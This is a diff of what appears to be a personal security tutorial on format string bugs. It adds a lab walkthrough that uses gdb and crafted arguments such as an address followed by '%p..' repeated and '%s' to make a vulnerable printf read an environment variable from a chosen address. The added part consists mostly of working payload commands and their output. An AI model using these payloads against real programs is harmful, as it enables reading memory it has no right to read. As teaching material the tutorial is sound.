@@ -144,7 +144,73 @@ vagrant@vagrant:~/scratch$ printf "\x2e\x2e\x70\x25\n"
 ..p%
 ~~~
 
-Do remember we're using little-endian, so the bytes are printed backwards. Unlike the first example where the format string was located at `0x08048590`, this time it has been placed fully on the stack! And as we walk down the stack we encounter what we put on.
+Do remember we're using little-endian, so the bytes are printed backwards. Unlike the first example where the format string was located at `0x08048590`, this time *it has been placed fully on the stack*! And as we walk down the stack we encounter what we put on.
 
-This unfortunately means we cannot read past our input - but we can trick `printf` into reading a string at a memory location of our choosing.
+This unfortunately means we cannot read past our input using `%p` - but we can trick `printf` into reading a string at a memory location of our choosing. If we use the `%s` format, `printf` will use what's on the stack  as the address of a string and will read until a null byte is found. But what shall we read? Let's try an environment variable.
 
+Now `gdb` does some funky stuff meaning the environment we execute under differs to the one outside. Thankfully there's something we can do about it but it's a little messy (I'm sure there *must* be a better way). We'll use `env -i` to ignore the current environment. Let's also figure out where we need to place our `%s`:
+
+~~~ shell
+vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*5')
+DDDD0xffffdd54..0xf7ffd000..0xf7fefec9..0x44444444..0x2e2e7025..
+~~~
+
+This means we should have 3 `%p` before adding our `%s` - which, as it stands, would cause `printf` to try and read the string located at `0x44444444` which sure enough, segfaults:
+
+~~~ shell
+vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*3 + "%s"')
+Segmentation fault (core dumped)
+~~~
+
+We need to figure out where our environment variable is located:
+
+~~~ shell
+vagrant@vagrant:~/scratch$ env -i PWD=$(pwd) SOME_VAR=foobar gdb -q --args /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*3 + "%s"')
+Reading symbols from /home/vagrant/scratch/a.out...done.
+(gdb) show env
+PWD=/home/vagrant/scratch
+SOME_VAR=foobar
+LINES=29
+COLUMNS=211
+~~~
+
+Despite `env -i`, `gdb` still added stuff! Okay let's add that to our environment too.
+
+~~~ shell
+vagrant@vagrant:~/scratch$ env -i PWD=$(pwd) SOME_VAR=foobar LINES=29 COLUMNS=211 gdb -q --args /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*3 + "%s"')
+Reading symbols from /home/vagrant/scratch/a.out...done.
+(gdb) show env
+PWD=/home/vagrant/scratch
+SOME_VAR=foobar
+LINES=29
+COLUMNS=211
+(gdb) break main
+Breakpoint 1 at 0x80484b1: file printf_c.c, line 8.
+(gdb) r
+Starting program: /home/vagrant/scratch/a.out DDDD%p..%p..%p..%s
+
+Breakpoint 1, main (argc=2, argv=0xffffde84) at printf_c.c:8
+8         strcpy(buffer, argv[1]);
+(gdb) x/4s *environ
+0xffffdf9d:     "SOME_VAR=foobar"
+0xffffdfad:     "COLUMNS=211"
+0xffffdfb9:     "PWD=/home/vagrant/scratch"
+0xffffdfd3:     "LINES=29"
+(gdb) p/x 0xffffdf9d+9
+$1 = 0xffffdfa6
+~~~
+
+Again `gdb` makes things a little more difficult - the order of the variables differs from the one we specified. It just means we need to call our binary with the vars in that order - and `SOME_VAR` will be located at `0xffffdf9d` + 9 bytes (one for each character of `SOME_VAR=`). We're now ready to run this:
+
+~~~ shell
+vagrant@vagrant:~/scratch$ env -i SOME_VAR=foobar COLUMNS=211 LINES=29 PWD=/home/vagrant/scratch /home/vagrant/scratch/a.out $(python -c 'print "\xa6\xdf\xff\xff" + "%p.."*3 + "%s"')
+▒▒0xffffdf8a..0xf7ffd000..0xf7fefec9..foobar
+~~~
+
+Success!
+
+The astute reader would have pointed out this would have been *much* simpler using `getenv` but I was hell bent on getting this to work with `gdb`. Heh.
+
+## Writing to an arbitrary address?
+
+TBA
